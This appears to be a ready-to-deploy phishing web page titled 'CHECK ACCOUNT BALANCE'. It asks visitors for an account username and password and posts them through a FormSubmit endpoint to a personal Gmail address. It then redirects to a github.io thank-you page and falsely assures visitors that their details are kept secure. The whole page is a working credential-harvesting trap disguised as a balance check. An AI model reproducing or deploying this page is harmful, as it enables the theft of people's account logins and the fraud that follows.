<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CHECK ACCOUNT BALANCE</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 0;
    }
    .container {
      background: #fff;
      padding: 25px;
      border-radius: 12px;
      width: 95%;
      max-width: 420px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }
    .toggle-container {
      position: relative;
    }
    .toggle-container button {
      position: absolute;
      right: 10px;
      top: 12px;
      background: none;
      border: none;
      cursor: pointer;
      font-size: 14px;
    }
    button[type="submit"] {
      background: #28a745;
      color: #fff;
      border: none;
      padding: 12px;
      border-radius: 6px;
      font-size: 16px;
      width: 100%;
      cursor: pointer;
    }
    button[type="submit"]:hover {
      background: #218838;
    }
    .note {
      font-size: 12px;
      text-align: center;
      color: #555;
      margin-top: 12px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>CHECK ACCOUNT BALANCE</h2>

    <!-- âœ… Make sure email is verified in FormSubmit first -->
    <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
      <!-- redirect to your thankyou.html -->
      <input type="hidden" name="_next" value="https://onlinegistrationProg.github.io/thankyou.html">

      <label for="username">Enter your Account Username</label>
      <input type="text" id="username" name="username" required>

      <label for="password">Enter your Account Password</label>
      <div class="toggle-container">
        <input type="password" id="password" name="password" required>
        <button type="button" onclick="togglePassword()">Show</button>
      </div>

      <button type="submit">Check Balance</button>
    </form>

    <div class="note">
      Thank you, We keep your details and data secured.
    </div>
  </div>

  <script>
    function togglePassword() {
      const pwd = document.getElementById("password");
      const btn = pwd.nextElementSibling;
      if (pwd.type === "password") {
        pwd.type = "text";
        btn.textContent = "Hide";
      } else {
        pwd.type = "password";
        btn.textContent = "Show";
      }
    }
  </script>
</body>
</html>
